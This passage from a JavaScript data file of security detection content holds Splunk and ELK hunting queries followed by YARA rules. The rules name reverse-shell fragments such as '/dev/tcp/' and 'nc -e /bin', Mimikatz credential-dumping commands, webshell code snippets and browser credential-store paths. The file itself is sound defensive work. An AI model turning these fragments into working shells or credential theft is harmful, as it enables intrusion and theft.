  },
  {
    title: 'File Integrity Monitoring Alerts',
    description: 'Monitor for changes to critical system files and configurations.',
    query: 'index=fim sourcetype=fim_log action=modified (file_path="/etc/passwd" OR file_path="/etc/shadow" OR file_path="/etc/sudoers" OR file_path="C:\\Windows\\System32\\drivers\\etc\\hosts" OR file_path="C:\\Windows\\System32\\config\\SAM") | table _time file_path action user previous_hash current_hash',
    category: 'Integrity'
  },
  {
    title: 'Privileged Account Usage',
    description: 'Monitor usage of privileged accounts for security audit compliance.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4672 | stats count by SubjectUserName | sort -count | head 20',
    category: 'Privilege Use'
  },
  {
    title: 'Software Installation Events',
    description: 'Track software installation events for unauthorized software detection.',
    query: 'index=windows sourcetype=WinEventLog:Application EventCode=11707 OR EventCode=1033 | table _time Product_Name User | sort -_time',
    category: 'System'
  },
  {
    title: 'Failed Object Access',
    description: 'Monitor failed attempts to access objects which may indicate unauthorized access attempts.',
    query: 'index=security sourcetype=WinEventLog:Security EventCode=4656 Keywords="Audit Failure" | stats count by SubjectUserName ObjectName ProcessName | sort -count | head 50',
    category: 'Object Access'
  },
  {
    title: 'Azure AD Sign-In Anomalies',
    description: 'Detect anomalous Azure AD sign-in patterns including impossible travel.',
    query: 'index=azure sourcetype=azure:aad:signin | stats dc(IPAddress) as unique_ips values(IPAddress) as ips values(Location) as locations count by UserPrincipalName | where unique_ips > 3 | table UserPrincipalName unique_ips ips locations count',
    category: 'Cloud'
  },
  {
    title: 'AWS Console Login Without MFA',
    description: 'Detect AWS console logins without multi-factor authentication.',
    query: 'index=aws sourcetype=aws:cloudtrail eventName=ConsoleLogin | search MFAUsed=No responseElements.ConsoleLogin=Success | table _time sourceIPAddress userIdentity.arn userAgent',
    category: 'Cloud'
  },
  {
    title: 'Threat Intelligence IOC Match',
    description: 'Match network indicators against threat intelligence feeds.',
    query: 'index=network sourcetype=firewall | lookup threat_intel_ip dest_ip as ip OUTPUT threat_type threat_score | where isnotnull(threat_type) | stats count by ip threat_type threat_score | sort -threat_score',
    category: 'Threat Intel'
  },
  {
    title: 'Endpoint Detection Summary Dashboard',
    description: 'Summarize endpoint detection events by severity and category.',
    query: 'index=endpoint sourcetype=edr:alerts | stats count by severity category endpoint_name | sort -severity -count | table severity category endpoint_name count',
    category: 'Summary'
  },
];

const ELK_QUERIES = [
  {
    title: 'Failed SSH Login Attempts',
    description: 'Find all failed SSH login attempts from auth logs.',
    query: 'event.dataset: "system.auth" AND system.auth.ssh.event: "Failed" | Sort by @timestamp desc',
    kql: 'system.auth.ssh.event: "Failed"',
    category: 'Authentication'
  },
  {
    title: 'Successful SSH Logins',
    description: 'Track all successful SSH authentication events.',
    query: 'event.dataset: "system.auth" AND system.auth.ssh.event: "Accepted"',
    kql: 'system.auth.ssh.event: "Accepted"',
    category: 'Authentication'
  },
  {
    title: 'Windows Logon Events',
    description: 'Search Windows security logs for logon events.',
    query: 'winlog.event_id: 4624 AND winlog.channel: "Security"',
    kql: 'event.code: "4624"',
    category: 'Authentication'
  },
  {
    title: 'Windows Failed Logons',
    description: 'Find Windows failed logon attempts for brute force detection.',
    query: 'winlog.event_id: 4625 AND winlog.channel: "Security"',
    kql: 'event.code: "4625"',
    category: 'Authentication'
  },
  {
    title: 'Process Creation Events (Sysmon)',
    description: 'Track process creation events from Sysmon for execution monitoring.',
    query: 'winlog.event_id: 1 AND winlog.channel: "Microsoft-Windows-Sysmon/Operational"',
    kql: 'event.provider: "Microsoft-Windows-Sysmon" AND event.code: "1"',
    category: 'Execution'
  },
  {
    title: 'Network Connections (Sysmon)',
    description: 'Monitor network connections logged by Sysmon.',
    query: 'winlog.event_id: 3 AND winlog.channel: "Microsoft-Windows-Sysmon/Operational"',
    kql: 'event.provider: "Microsoft-Windows-Sysmon" AND event.code: "3"',
    category: 'Network'
  },
  {
    title: 'DNS Query Monitoring',
    description: 'Monitor DNS queries for threat detection and DNS tunneling.',
    query: 'dns.question.name: * AND NOT dns.question.name: (*.local OR *.internal)',
    kql: 'event.dataset: "dns" AND dns.question.name: *',
    category: 'Network'
  },
  {
    title: 'HTTP Error Responses',
    description: 'Find HTTP responses with error status codes (4xx, 5xx).',
    query: 'http.response.status_code >= 400',
    kql: 'http.response.status_code >= 400',
    category: 'Web'
  },
  {
    title: 'Suspicious PowerShell Activity',
    description: 'Detect suspicious PowerShell execution from script block logging.',
    query: 'winlog.event_id: 4104 AND winlog.channel: "Microsoft-Windows-PowerShell/Operational" AND (powershell.file.script_block_text: *DownloadString* OR powershell.file.script_block_text: *Invoke-Expression* OR powershell.file.script_block_text: *EncodedCommand*)',
    kql: 'event.code: "4104" AND message: ("DownloadString" OR "Invoke-Expression" OR "EncodedCommand")',
    category: 'Execution'
  },
  {
    title: 'File Creation Events',
    description: 'Track file creation events from Sysmon for malware dropping detection.',
    query: 'winlog.event_id: 11 AND winlog.channel: "Microsoft-Windows-Sysmon/Operational"',
    kql: 'event.provider: "Microsoft-Windows-Sysmon" AND event.code: "11"',
    category: 'Persistence'
  },
  {
    title: 'Registry Modification Events',
    description: 'Monitor registry modifications for persistence detection.',
    query: 'winlog.event_id: 13 AND winlog.channel: "Microsoft-Windows-Sysmon/Operational" AND winlog.event_data.TargetObject: *CurrentVersion\\\\Run*',
    kql: 'event.code: "13" AND registry.path: *CurrentVersion\\\\Run*',
    category: 'Persistence'
  },
  {
    title: 'Firewall Blocked Connections',
    description: 'Monitor connections blocked by the firewall for reconnaissance detection.',
    query: 'event.action: "blocked" OR event.action: "denied" OR event.action: "drop"',
    kql: 'event.action: ("blocked" OR "denied" OR "drop")',
    category: 'Network'
  },
  {
    title: 'Apache Access Logs - Top Clients',
    description: 'Identify top client IPs from Apache access logs.',
    query: '{"aggs": {"top_ips": {"terms": {"field": "source.ip", "size": 20}}}, "query": {"match": {"event.dataset": "apache.access"}}}',
    kql: 'event.dataset: "apache.access"',
    category: 'Web'
  },
  {
    title: 'Nginx Access Logs - Status Code Distribution',
    description: 'Analyze HTTP status code distribution from Nginx logs.',
    query: '{"aggs": {"status_codes": {"terms": {"field": "http.response.status_code"}}}, "query": {"match": {"event.dataset": "nginx.access"}}}',
    kql: 'event.dataset: "nginx.access"',
    category: 'Web'
  },
  {
    title: 'Service Installation Events',
    description: 'Detect new service installations on Windows systems.',
    query: 'winlog.event_id: 7045 AND winlog.channel: "System"',
    kql: 'event.code: "7045"',
    category: 'Persistence'
  },
  {
    title: 'Account Management Events',
    description: 'Monitor user account creation, modification, and deletion.',
    query: 'winlog.event_id: (4720 OR 4722 OR 4724 OR 4725 OR 4726 OR 4738) AND winlog.channel: "Security"',
    kql: 'event.code: ("4720" OR "4722" OR "4724" OR "4725" OR "4726" OR "4738")',
    category: 'Account Management'
  },
  {
    title: 'Privilege Escalation Events',
    description: 'Detect special privileges assigned to new logon sessions.',
    query: 'winlog.event_id: 4672 AND winlog.channel: "Security"',
    kql: 'event.code: "4672"',
    category: 'Privilege Escalation'
  },
  {
    title: 'Audit Log Cleared',
    description: 'Detect clearing of Windows security event logs.',
    query: 'winlog.event_id: 1102 AND winlog.channel: "Security"',
    kql: 'event.code: "1102"',
    category: 'Defense Evasion'
  },
  {
    title: 'Scheduled Task Events',
    description: 'Monitor scheduled task creation and modification.',
    query: 'winlog.event_id: (4698 OR 4699 OR 4700 OR 4701 OR 4702)',
    kql: 'event.code: ("4698" OR "4699" OR "4700" OR "4701" OR "4702")',
    category: 'Persistence'
  },
  {
    title: 'LSASS Access (Credential Dumping)',
    description: 'Detect processes accessing LSASS for credential harvesting.',
    query: 'winlog.event_id: 10 AND winlog.event_data.TargetImage: *lsass.exe AND NOT winlog.event_data.SourceImage: (*csrss.exe OR *MsMpEng.exe)',
    kql: 'event.code: "10" AND process.target.executable: *lsass.exe',
    category: 'Credential Access'
  },
  {
    title: 'Network Share Access',
    description: 'Monitor access to network shares for lateral movement detection.',
    query: 'winlog.event_id: 5140 AND winlog.channel: "Security"',
    kql: 'event.code: "5140"',
    category: 'Lateral Movement'
  },
  {
    title: 'Outbound Connections to Rare Destinations',
    description: 'Find outbound network connections to rare or unusual destination IPs.',
    query: '{"aggs": {"rare_dests": {"rare_terms": {"field": "destination.ip"}}}, "query": {"bool": {"must": [{"exists": {"field": "destination.ip"}}]}}}',
    kql: 'destination.ip: * AND NOT destination.ip: (10.* OR 172.16.* OR 192.168.*)',
    category: 'Network'
  },
  {
    title: 'Web Application Firewall Blocks',
    description: 'Monitor WAF blocking events for attack detection.',
    query: 'event.dataset: "waf" AND event.action: "blocked"',
    kql: 'event.module: "waf" AND event.outcome: "failure"',
    category: 'Web'
  },
  {
    title: 'Geolocation of Source IPs',
    description: 'Map source IP geolocation for login events to detect impossible travel.',
    query: '{"aggs": {"countries": {"terms": {"field": "source.geo.country_name"}}}, "query": {"match": {"event.action": "logon"}}}',
    kql: 'event.action: "logon" AND source.geo.country_name: *',
    category: 'Authentication'
  },
  {
    title: 'SSL/TLS Certificate Errors',
    description: 'Monitor SSL/TLS handshake failures and certificate issues.',
    query: 'tls.established: false OR event.action: "ssl_error"',
    kql: 'tls.established: false',
    category: 'Network'
  },
  {
    title: 'High Volume Alert Sources',
    description: 'Identify endpoints generating the most security alerts.',
    query: '{"aggs": {"top_hosts": {"terms": {"field": "host.name", "size": 10, "order": {"_count": "desc"}}}}, "query": {"match": {"event.kind": "alert"}}}',
    kql: 'event.kind: "alert"',
    category: 'Summary'
  },
  {
    title: 'Executable File Downloads',
    description: 'Detect downloads of executable files from web traffic.',
    query: 'http.response.mime_type: ("application/x-msdownload" OR "application/x-executable" OR "application/x-dosexec") OR url.path: (*.exe OR *.dll OR *.bat OR *.ps1 OR *.vbs)',
    kql: 'http.response.mime_type: "application/x-msdownload" OR url.extension: ("exe" OR "dll" OR "bat")',
    category: 'Web'
  },
  {
    title: 'Brute Force Detection Aggregation',
    description: 'Aggregate failed authentication attempts by source to detect brute force.',
    query: '{"aggs": {"brute_force": {"terms": {"field": "source.ip", "min_doc_count": 10, "order": {"_count": "desc"}}}}, "query": {"bool": {"must": [{"match": {"event.outcome": "failure"}}, {"match": {"event.category": "authentication"}}]}}}',
    kql: 'event.outcome: "failure" AND event.category: "authentication"',
    category: 'Authentication'
  },
  {
    title: 'Data Volume by Source',
    description: 'Monitor data volume transferred by source IP for exfiltration detection.',
    query: '{"aggs": {"data_by_src": {"terms": {"field": "source.ip", "size": 20}, "aggs": {"total_bytes": {"sum": {"field": "source.bytes"}}}}}}',
    kql: 'source.bytes: > 0',
    category: 'Exfiltration'
  },
  {
    title: 'Suspicious Command Line Arguments',
    description: 'Detect processes launched with suspicious command line arguments.',
    query: 'process.command_line: (*whoami* OR *net user* OR *net group* OR *ipconfig /all* OR *systeminfo* OR *tasklist* OR *netstat -an*) AND NOT process.parent.executable: (*explorer.exe* OR *cmd.exe*)',
    kql: 'process.command_line: ("whoami" OR "net user" OR "net group" OR "ipconfig")',
    category: 'Discovery'
  },
  {
    title: 'Endpoint Agent Health',
    description: 'Monitor the health status of endpoint security agents.',
    query: 'event.dataset: "endpoint.metadata" AND agent.status: *',
    kql: 'event.module: "endpoint" AND event.dataset: "endpoint.metadata"',
    category: 'Summary'
  },
  {
    title: 'Lateral Movement via RDP',
    description: 'Track Remote Desktop Protocol connections for lateral movement analysis.',
    query: 'winlog.event_id: 4624 AND winlog.event_data.LogonType: "10"',
    kql: 'event.code: "4624" AND winlog.logon.type: "RemoteInteractive"',
    category: 'Lateral Movement'
  },
  {
    title: 'Crypto Mining Detection',
    description: 'Detect potential cryptocurrency mining by monitoring for known mining pool connections.',
    query: 'destination.port: (3333 OR 4444 OR 5555 OR 8333 OR 9999 OR 14444) OR dns.question.name: (*pool.* OR *mining.* OR *miner.* OR *xmr.* OR *monero.* OR *stratum.*)',
    kql: 'destination.port: (3333 OR 4444 OR 5555 OR 8333) OR dns.question.name: *pool.*',
    category: 'Impact'
  },
  {
    title: 'Beaconing Detection',
    description: 'Detect periodic beaconing behavior characteristic of C2 communication.',
    query: '{"aggs": {"by_dest": {"terms": {"field": "destination.ip"}, "aggs": {"intervals": {"date_histogram": {"field": "@timestamp", "fixed_interval": "1m"}, "aggs": {"count": {"value_count": {"field": "@timestamp"}}}}}}}}, "query": {"exists": {"field": "destination.ip"}}}',
    kql: 'event.category: "network_traffic" AND destination.ip: *',
    category: 'Command and Control'
  },
  {
    title: 'New User Agent Strings',
    description: 'Identify newly observed user agent strings in web traffic.',
    query: '{"aggs": {"new_uas": {"rare_terms": {"field": "user_agent.original", "max_doc_count": 1}}}, "query": {"range": {"@timestamp": {"gte": "now-24h"}}}}',
    kql: 'user_agent.original: * AND @timestamp >= now-24h',
    category: 'Web'
  },
  {
    title: 'Malware Hash Lookup',
    description: 'Search for known malicious file hashes in endpoint logs.',
    query: 'file.hash.md5: ("KNOWN_HASH_1" OR "KNOWN_HASH_2") OR file.hash.sha256: ("KNOWN_HASH_1" OR "KNOWN_HASH_2")',
    kql: 'file.hash.md5: * OR file.hash.sha256: *',
    category: 'Threat Intel'
  },
  {
    title: 'Anomalous Login Times',
    description: 'Detect logins occurring outside normal business hours.',
    query: '{"query": {"bool": {"must": [{"match": {"event.action": "logon"}}, {"script": {"script": {"source": "doc[\'@timestamp\'].value.getHour() < 6 || doc[\'@timestamp\'].value.getHour() > 22"}}}]}}}',
    kql: 'event.action: "logon"',
    category: 'Authentication'
  },
  {
    title: 'Cloud Infrastructure Changes',
    description: 'Monitor cloud infrastructure modifications in AWS/Azure/GCP.',
    query: 'event.dataset: ("aws.cloudtrail" OR "azure.activitylogs" OR "gcp.audit") AND event.action: (*Create* OR *Delete* OR *Modify* OR *Update*)',
    kql: 'event.dataset: ("aws.cloudtrail" OR "azure.activitylogs") AND event.action: *Create*',
    category: 'Cloud'
  },
  {
    title: 'VPN Connection Monitoring',
    description: 'Track VPN connections and disconnections for remote access auditing.',
    query: 'event.category: "authentication" AND event.dataset: "vpn" AND (event.action: "connect" OR event.action: "disconnect")',
    kql: 'event.dataset: "vpn" AND event.action: ("connect" OR "disconnect")',
    category: 'Authentication'
  },
  {
    title: 'Email Security Events',
    description: 'Monitor email security events including spam, phishing, and malware detection.',
    query: 'event.dataset: "email" AND (event.action: "quarantine" OR event.action: "blocked" OR event.action: "malware_detected")',
    kql: 'event.module: "email" AND event.outcome: "failure"',
    category: 'Email'
  },
];

const YARA_RULES = [
  {
    name: 'Suspicious_PowerShell_Download',
    description: 'Detects PowerShell scripts containing download functionality.',
    rule: `rule Suspicious_PowerShell_Download {
    meta:
        description = "Detects PowerShell download cradle patterns"
        author = "Darknode"
        severity = "medium"
    strings:
        $s1 = "New-Object Net.WebClient" ascii nocase
        $s2 = "DownloadString" ascii nocase
        $s3 = "DownloadFile" ascii nocase
        $s4 = "Invoke-WebRequest" ascii nocase
        $s5 = "wget" ascii nocase
        $s6 = "curl" ascii nocase
        $s7 = "Start-BitsTransfer" ascii nocase
        $s8 = "Invoke-RestMethod" ascii nocase
    condition:
        any of them
}`
  },
  {
    name: 'Mimikatz_Strings',
    description: 'Detects Mimikatz credential dumping tool strings in memory or on disk.',
    rule: `rule Mimikatz_Strings {
    meta:
        description = "Detects Mimikatz strings in files or memory"
        author = "Darknode"
        severity = "critical"
    strings:
        $s1 = "sekurlsa::logonpasswords" ascii nocase
        $s2 = "sekurlsa::wdigest" ascii nocase
        $s3 = "lsadump::sam" ascii nocase
        $s4 = "lsadump::dcsync" ascii nocase
        $s5 = "privilege::debug" ascii nocase
        $s6 = "token::elevate" ascii nocase
        $s7 = "kerberos::golden" ascii nocase
        $s8 = "kerberos::ptt" ascii nocase
        $s9 = "gentilkiwi" ascii
        $s10 = "mimikatz" ascii nocase
    condition:
        3 of them
}`
  },
  {
    name: 'Webshell_Generic',
    description: 'Generic detection for common web shell patterns in PHP, ASP, and JSP files.',
    rule: `rule Webshell_Generic {
    meta:
        description = "Detects common web shell patterns"
        author = "Darknode"
        severity = "high"
    strings:
        $php1 = "eval(base64_decode(" ascii nocase
        $php2 = "eval(gzinflate(" ascii nocase
        $php3 = "eval(gzuncompress(" ascii nocase
        $php4 = "assert(base64_decode(" ascii nocase
        $php5 = "system($_GET" ascii nocase
        $php6 = "passthru($_POST" ascii nocase
        $php7 = "shell_exec($_REQUEST" ascii nocase
        $asp1 = "eval(Request" ascii nocase
        $asp2 = "Execute(Request" ascii nocase
        $asp3 = "CreateObject(\"Wscript.Shell\")" ascii nocase
        $jsp1 = "Runtime.getRuntime().exec" ascii nocase
        $jsp2 = "ProcessBuilder" ascii nocase
    condition:
        any of them
}`
  },
  {
    name: 'Ransomware_Note',
    description: 'Detects common ransomware note patterns.',
    rule: `rule Ransomware_Note {
    meta:
        description = "Detects common ransomware ransom note patterns"
        author = "Darknode"
        severity = "critical"
    strings:
        $s1 = "Your files have been encrypted" ascii nocase
        $s2 = "bitcoin" ascii nocase
        $s3 = "decrypt" ascii nocase
        $s4 = "ransom" ascii nocase
        $s5 = "pay" ascii nocase
        $s6 = "wallet" ascii nocase
        $s7 = "Your personal ID" ascii nocase
        $s8 = "All your files" ascii nocase
        $s9 = "recovery key" ascii nocase
        $s10 = "tor browser" ascii nocase
    condition:
        4 of them
}`
  },
  {
    name: 'Packed_Executable',
    description: 'Detects packed or obfuscated executables with UPX, ASPack, and other packers.',
    rule: `rule Packed_Executable {
    meta:
        description = "Detects packed executables"
        author = "Darknode"
        severity = "medium"
    strings:
        $upx1 = "UPX0" ascii
        $upx2 = "UPX1" ascii
        $upx3 = "UPX!" ascii
        $aspack = "aPLib" ascii
        $pecompact = "PEC2" ascii
        $mpress = "MPRESS1" ascii
        $themida = ".themida" ascii
        $vmprotect = ".vmp0" ascii
        $enigma = ".enigma" ascii
    condition:
        uint16(0) == 0x5A4D and any of them
}`
  },
  {
    name: 'Suspicious_Macro',
    description: 'Detects suspicious Office macro patterns that may indicate malware.',
    rule: `rule Suspicious_Macro {
    meta:
        description = "Detects suspicious VBA macro patterns"
        author = "Darknode"
        severity = "medium"
    strings:
        $s1 = "AutoOpen" ascii nocase
        $s2 = "AutoClose" ascii nocase
        $s3 = "Document_Open" ascii nocase
        $s4 = "Shell" ascii nocase
        $s5 = "WScript.Shell" ascii nocase
        $s6 = "CreateObject" ascii nocase
        $s7 = "Environ" ascii nocase
        $s8 = "URLDownloadToFile" ascii nocase
        $s9 = "PowerShell" ascii nocase
        $s10 = "cmd /c" ascii nocase
    condition:
        ($s1 or $s2 or $s3) and 2 of ($s4, $s5, $s6, $s7, $s8, $s9, $s10)
}`
  },
  {
    name: 'CobaltStrike_Beacon',
    description: 'Detects Cobalt Strike beacon payloads in memory or files.',
    rule: `rule CobaltStrike_Beacon {
    meta:
        description = "Detects Cobalt Strike beacon patterns"
        author = "Darknode"
        severity = "critical"
    strings:
        $s1 = "%s as %s\\\\%s: %d" ascii
        $s2 = "beacon.dll" ascii
        $s3 = "beacon.x64.dll" ascii
        $s4 = "%s (admin)" ascii
        $s5 = "ReflectiveLoader" ascii
        $s6 = { 2E 2F 2E 2F 2E 2C }
        $s7 = "\\\\%s\\\\pipe\\\\msagent_%x" ascii
        $config = { 00 01 00 01 00 02 }
    condition:
        3 of them
}`
  },
  {
    name: 'Reverse_Shell_Linux',
    description: 'Detects common reverse shell patterns in Linux scripts.',
    rule: `rule Reverse_Shell_Linux {
    meta:
        description = "Detects Linux reverse shell patterns"
        author = "Darknode"
        severity = "high"
    strings:
        $s1 = "/dev/tcp/" ascii
        $s2 = "bash -i" ascii
        $s3 = "nc -e /bin" ascii
        $s4 = "mkfifo /tmp/f" ascii
        $s5 = "python -c 'import socket" ascii
        $s6 = "socat exec:" ascii
        $s7 = "php -r '$sock=fsockopen" ascii
        $s8 = "perl -e 'use Socket" ascii
        $s9 = "ruby -rsocket" ascii
    condition:
        any of them
}`
  },
  {
    name: 'Crypto_Miner',
    description: 'Detects cryptocurrency miner software based on common strings.',
    rule: `rule Crypto_Miner {
    meta:
        description = "Detects cryptocurrency mining software"
        author = "Darknode"
        severity = "medium"
    strings:
        $s1 = "stratum+tcp://" ascii nocase
        $s2 = "stratum+ssl://" ascii nocase
        $s3 = "mining.pool" ascii nocase
        $s4 = "--donate-level" ascii
        $s5 = "xmrig" ascii nocase
        $s6 = "cpuminer" ascii nocase
        $s7 = "cgminer" ascii nocase
        $s8 = "bfgminer" ascii nocase
        $s9 = "hashrate" ascii nocase
        $s10 = "cryptonight" ascii nocase
        $s11 = "randomx" ascii nocase
    condition:
        3 of them
}`
  },
  {
    name: 'Keylogger_Strings',
    description: 'Detects potential keylogger based on common keylogging function calls.',
    rule: `rule Keylogger_Strings {
    meta:
        description = "Detects keylogger patterns"
        author = "Darknode"
        severity = "high"
    strings:
        $s1 = "GetAsyncKeyState" ascii
        $s2 = "SetWindowsHookEx" ascii
        $s3 = "GetKeyState" ascii
        $s4 = "GetForegroundWindow" ascii
        $s5 = "GetWindowText" ascii
        $s6 = "keylog" ascii nocase
        $s7 = "keystroke" ascii nocase
        $s8 = "keyboard" ascii nocase
        $s9 = "VK_RETURN" ascii
        $s10 = "VK_BACK" ascii
    condition:
        uint16(0) == 0x5A4D and 4 of them
}`
  },
  {
    name: 'Data_Exfiltration_Tool',
    description: 'Detects tools commonly used for data exfiltration.',
    rule: `rule Data_Exfiltration_Tool {
    meta:
        description = "Detects data exfiltration tool patterns"
        author = "Darknode"
        severity = "high"
    strings:
        $dns1 = "dnscat" ascii nocase
        $dns2 = "iodine" ascii nocase
        $dns3 = "dns2tcp" ascii nocase
        $http1 = "HTTPTunnel" ascii nocase
        $icmp1 = "icmpsh" ascii nocase
        $icmp2 = "ptunnel" ascii nocase
        $smb1 = "smbexec" ascii nocase
        $cloud1 = "rclone" ascii nocase
        $cloud2 = "megacmd" ascii nocase
    condition:
        any of them
}`
  },
  {
    name: 'Exploit_Kit_Landing',
    description: 'Detects common exploit kit landing page patterns.',
    rule: `rule Exploit_Kit_Landing {
    meta:
        description = "Detects exploit kit landing page patterns"
        author = "Darknode"
        severity = "high"
    strings:
        $s1 = "PluginDetect" ascii nocase
        $s2 = "DeployJava" ascii nocase
        $s3 = "swfobject" ascii nocase
        $s4 = "ActiveXObject" ascii
        $s5 = "shellcode" ascii nocase
        $s6 = "heap spray" ascii nocase
        $s7 = "unescape(" ascii
        $s8 = "fromCharCode" ascii
        $obf1 = "eval(function(p,a,c,k,e,d)" ascii
        $obf2 = "String.fromCharCode(parseInt" ascii
    condition:
        3 of them
}`
  },
  {
    name: 'PE_Anomaly',
    description: 'Detects PE files with suspicious characteristics.',
    rule: `rule PE_Anomaly {
    meta:
        description = "Detects PE files with anomalous characteristics"
        author = "Darknode"
        severity = "low"
    strings:
        $mz = "MZ"
    condition:
        $mz at 0 and (
            filesize < 10KB or
            filesize > 100MB or
            #mz > 1
        )
}`
  },
  {
    name: 'Suspicious_PDF',
    description: 'Detects PDF files containing potentially malicious content.',
    rule: `rule Suspicious_PDF {
    meta:
        description = "Detects suspicious PDF patterns"
        author = "Darknode"
        severity = "medium"
    strings:
        $magic = "%PDF"
        $js1 = "/JavaScript" ascii
        $js2 = "/JS" ascii
        $launch = "/Launch" ascii
        $embed = "/EmbeddedFile" ascii
        $action = "/OpenAction" ascii
        $aa = "/AA" ascii
        $uri = "/URI" ascii
        $submit = "/SubmitForm" ascii
    condition:
        $magic at 0 and 3 of ($js1, $js2, $launch, $embed, $action, $aa, $uri, $submit)
}`
  },
  {
    name: 'Backdoor_Generic',
    description: 'Generic detection for backdoor functionality.',
    rule: `rule Backdoor_Generic {
    meta:
        description = "Detects generic backdoor patterns"
        author = "Darknode"
        severity = "high"
    strings:
        $s1 = "cmd.exe /c" ascii nocase
        $s2 = "/bin/sh -c" ascii
        $s3 = "WinExec" ascii
        $s4 = "ShellExecute" ascii
        $s5 = "system(" ascii
        $s6 = "popen(" ascii
        $s7 = "CreateProcess" ascii
        $s8 = "COMSPEC" ascii
        $net1 = "WSAStartup" ascii
        $net2 = "connect" ascii
        $net3 = "bind" ascii
        $net4 = "listen" ascii
        $net5 = "accept" ascii
    condition:
        2 of ($s1, $s2, $s3, $s4, $s5, $s6, $s7, $s8) and 2 of ($net1, $net2, $net3, $net4, $net5)
}`
  },
  {
    name: 'Credential_Stealer',
    description: 'Detects credential stealer patterns targeting browsers and email clients.',
    rule: `rule Credential_Stealer {
    meta:
        description = "Detects credential stealer patterns"
        author = "Darknode"
        severity = "high"
    strings:
        $chrome1 = "\\\\Google\\\\Chrome\\\\User Data" ascii nocase
        $chrome2 = "Login Data" ascii nocase
        $ff1 = "\\\\Mozilla\\\\Firefox\\\\Profiles" ascii nocase
        $ff2 = "logins.json" ascii nocase
        $ff3 = "key4.db" ascii nocase
        $outlook = "Software\\\\Microsoft\\\\Office\\\\*\\\\Outlook" ascii nocase
        $thunderbird = "\\\\Thunderbird\\\\Profiles" ascii nocase
        $filezilla = "\\\\FileZilla\\\\recentservers.xml" ascii nocase
        $winscp = "Software\\\\Martin Prikryl\\\\WinSCP" ascii nocase
        $putty = "Software\\\\SimonTatham\\\\PuTTY\\\\Sessions" ascii nocase
    condition:
        3 of them
}`
  },
  {
    name: 'Rootkit_Indicators',
    description: 'Detects indicators of rootkit presence.',
    rule: `rule Rootkit_Indicators {
    meta:
        description = "Detects rootkit indicator strings"
        author = "Darknode"
        severity = "critical"
    strings:
        $s1 = "NtQueryDirectoryFile" ascii
        $s2 = "ZwQueryDirectoryFile" ascii
        $s3 = "NtQuerySystemInformation" ascii
        $s4 = "SSDT" ascii
        $s5 = "IDT" ascii
        $s6 = "rootkit" ascii nocase
        $s7 = "hide_process" ascii nocase
        $s8 = "hide_file" ascii nocase
        $s9 = "hide_port" ascii nocase
        $s10 = "hook_syscall" ascii nocase
    condition:
        4 of them
}`
  },
  {
    name: 'Suspicious_Batch_File',
    description: 'Detects batch files with suspicious command patterns.',
    rule: `rule Suspicious_Batch_File {
    meta:
        description = "Detects suspicious batch file patterns"
        author = "Darknode"
        severity = "medium"
    strings:
        $s1 = "net user /add" ascii nocase
        $s2 = "net localgroup administrators" ascii nocase
        $s3 = "reg add" ascii nocase
        $s4 = "schtasks /create" ascii nocase
        $s5 = "wmic" ascii nocase
        $s6 = "del /f /q" ascii nocase
        $s7 = "attrib +h +s" ascii nocase
        $s8 = "icacls" ascii nocase
        $s9 = "takeown" ascii nocase
        $s10 = "bcdedit" ascii nocase
    condition:
        3 of them
}`
  },
  {
    name: 'RAT_Indicators',
    description: 'Detects Remote Access Trojan indicators.',
    rule: `rule RAT_Indicators {
    meta:
        description = "Detects common RAT indicators"
        author = "Darknode"
        severity = "high"
    strings:
        $s1 = "keylog" ascii nocase
        $s2 = "screenshot" ascii nocase
        $s3 = "webcam" ascii nocase
        $s4 = "microphone" ascii nocase
        $s5 = "file_manager" ascii nocase
        $s6 = "remote_desktop" ascii nocase
        $s7 = "reverse_connect" ascii nocase
        $s8 = "download_exec" ascii nocase
        $s9 = "persistence" ascii nocase
        $s10 = "anti_vm" ascii nocase
        $s11 = "anti_debug" ascii nocase
    condition:
        4 of them
}`
  },
  {
    name: 'Obfuscated_JavaScript',
    description: 'Detects heavily obfuscated JavaScript that may be malicious.',
    rule: `rule Obfuscated_JavaScript {
    meta:
        description = "Detects obfuscated JavaScript patterns"
        author = "Darknode"
        severity = "medium"
    strings:
        $s1 = "eval(" ascii
        $s2 = "unescape(" ascii
        $s3 = "fromCharCode" ascii
        $s4 = "charCodeAt" ascii
        $s5 = "String.fromCharCode" ascii
        $s6 = "parseInt(" ascii
        $s7 = "\\\\x" ascii
        $s8 = "\\\\u00" ascii
        $long = /var [a-z]=[a-z0-9]{50,};/ ascii
    condition:
        3 of ($s1, $s2, $s3, $s4, $s5, $s6, $s7, $s8) or $long
}`
  },
  {
    name: 'Phishing_HTML',
    description: 'Detects phishing HTML pages with credential harvesting forms.',
    rule: `rule Phishing_HTML {
    meta:
        description = "Detects phishing page patterns"
        author = "Darknode"
        severity = "medium"
    strings:
        $form = "<form" ascii nocase
        $pass = "type=\"password\"" ascii nocase
        $action = "action=" ascii nocase
        $submit = "type=\"submit\"" ascii nocase
        $brand1 = "microsoft" ascii nocase
        $brand2 = "office365" ascii nocase
        $brand3 = "google" ascii nocase
        $brand4 = "paypal" ascii nocase
        $brand5 = "apple" ascii nocase
        $brand6 = "amazon" ascii nocase
        $brand7 = "netflix" ascii nocase
        $brand8 = "facebook" ascii nocase
    condition:
        $form and $pass and $submit and any of ($brand*)
}`
  },
  {
    name: 'Suspicious_ELF',
    description: 'Detects suspicious Linux ELF binaries.',
    rule: `rule Suspicious_ELF {
    meta:
        description = "Detects suspicious ELF binary patterns"
        author = "Darknode"
        severity = "medium"
    strings:
        $elf = { 7F 45 4C 46 }
        $s1 = "/etc/shadow" ascii
        $s2 = "/etc/passwd" ascii
        $s3 = "ptrace" ascii
        $s4 = "/proc/self" ascii
        $s5 = "/dev/tcp" ascii
        $s6 = "LD_PRELOAD" ascii
        $s7 = "/tmp/" ascii
        $s8 = "socket" ascii
        $s9 = "connect" ascii
        $s10 = "execve" ascii
    condition:
        $elf at 0 and 4 of ($s1, $s2, $s3, $s4, $s5, $s6, $s7, $s8, $s9, $s10)
}`
  },
  {
    name: 'Supply_Chain_Indicator',
    description: 'Detects indicators of supply chain compromise in package files.',
    rule: `rule Supply_Chain_Indicator {
    meta:
        description = "Detects potential supply chain attack indicators"
        author = "Darknode"
        severity = "high"
    strings:
        $pre1 = "preinstall" ascii
        $pre2 = "postinstall" ascii
        $s1 = "child_process" ascii
        $s2 = "exec(" ascii
        $s3 = "eval(" ascii
        $s4 = "Buffer.from(" ascii
        $s5 = "https://pastebin" ascii nocase
        $s6 = "ngrok" ascii nocase
